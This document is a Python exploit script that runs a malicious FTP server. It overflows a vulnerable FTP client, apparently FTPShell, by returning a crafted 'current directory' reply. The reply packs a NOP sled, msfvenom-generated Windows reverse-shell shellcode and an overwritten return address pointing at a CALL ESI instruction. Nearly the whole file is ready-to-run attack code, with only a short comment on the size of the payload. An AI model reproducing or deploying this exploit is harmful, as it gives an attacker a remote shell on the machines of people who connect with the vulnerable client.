## using payload bigger than 351 bytes wont work. use the given one - creating exactly 351 bytes payload.

import socket
import sys

port = 21

# msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python -b '\x00\x22\x0d\x0a'
buf =  ""
buf += "\xbe\x10\xd6\x13\xc9\xda\xd8\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x52\x83\xc0\x04\x31\x70\x0e\x03\x60\xd8\xf1"
buf += "\x3c\x7c\x0c\x77\xbe\x7c\xcd\x18\x36\x99\xfc\x18\x2c"
buf += "\xea\xaf\xa8\x26\xbe\x43\x42\x6a\x2a\xd7\x26\xa3\x5d"
buf += "\x50\x8c\x95\x50\x61\xbd\xe6\xf3\xe1\xbc\x3a\xd3\xd8"
buf += "\x0e\x4f\x12\x1c\x72\xa2\x46\xf5\xf8\x11\x76\x72\xb4"
buf += "\xa9\xfd\xc8\x58\xaa\xe2\x99\x5b\x9b\xb5\x92\x05\x3b"
buf += "\x34\x76\x3e\x72\x2e\x9b\x7b\xcc\xc5\x6f\xf7\xcf\x0f"
buf += "\xbe\xf8\x7c\x6e\x0e\x0b\x7c\xb7\xa9\xf4\x0b\xc1\xc9"
buf += "\x89\x0b\x16\xb3\x55\x99\x8c\x13\x1d\x39\x68\xa5\xf2"
buf += "\xdc\xfb\xa9\xbf\xab\xa3\xad\x3e\x7f\xd8\xca\xcb\x7e"
buf += "\x0e\x5b\x8f\xa4\x8a\x07\x4b\xc4\x8b\xed\x3a\xf9\xcb"
buf += "\x4d\xe2\x5f\x80\x60\xf7\xed\xcb\xec\x34\xdc\xf3\xec"
buf += "\x52\x57\x80\xde\xfd\xc3\x0e\x53\x75\xca\xc9\x94\xac"
buf += "\xaa\x45\x6b\x4f\xcb\x4c\xa8\x1b\x9b\xe6\x19\x24\x70"
buf += "\xf6\xa6\xf1\xd7\xa6\x08\xaa\x97\x16\xe9\x1a\x70\x7c"
buf += "\xe6\x45\x60\x7f\x2c\xee\x0b\x7a\xa7\xd1\x64\xf0\xb0"
buf += "\xba\x76\xf8\xaf\x66\xfe\x1e\xa5\x86\x56\x89\x52\x3e"
buf += "\xf3\x41\xc2\xbf\x29\x2c\xc4\x34\xde\xd1\x8b\xbc\xab"
buf += "\xc1\x7c\x4d\xe6\xbb\x2b\x52\xdc\xd3\xb0\xc1\xbb\x23"
buf += "\xbe\xf9\x13\x74\x97\xcc\x6d\x10\x05\x76\xc4\x06\xd4"
buf += "\xee\x2f\x82\x03\xd3\xae\x0b\xc1\x6f\x95\x1b\x1f\x6f"
buf += "\x91\x4f\xcf\x26\x4f\x39\xa9\x90\x21\x93\x63\x4e\xe8"
buf += "\x73\xf5\xbc\x2b\x05\xfa\xe8\xdd\xe9\x4b\x45\x98\x16"
buf += "\x63\x01\x2c\x6f\x99\xb1\xd3\xba\x19\xc1\x99\xe6\x08"
buf += "\x4a\x44\x73\x09\x17\x77\xae\x4e\x2e\xf4\x5a\x2f\xd5"
buf += "\xe4\x2f\x2a\x91\xa2\xdc\x46\x8a\x46\xe2\xf5\xab\x42"

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", port))
        s.listen(5)
        print("[+] FTP server started on port: "+str(port)+"\r\n")
except:
        print("[x] Failed to start the server on port: "+str(port)+"\r\n")

eip = "\xed\x2e\x45" # CALL ESI from FTPShell.exe : 0x00452eed
nops = "\x90"*40
junk = "F"*(400 - len(nops) - len(buf))
payload = nops + buf + junk + eip

while True:
    conn, addr = s.accept()
    conn.send('220 FTP Server\r\n')
    print(conn.recv(1024))
    conn.send("331 OK\r\n")
    print(conn.recv(1024))
    conn.send('230 OK\r\n')
    print(conn.recv(1024))
    conn.send('220 "'+payload+'" is current directory\r\n')
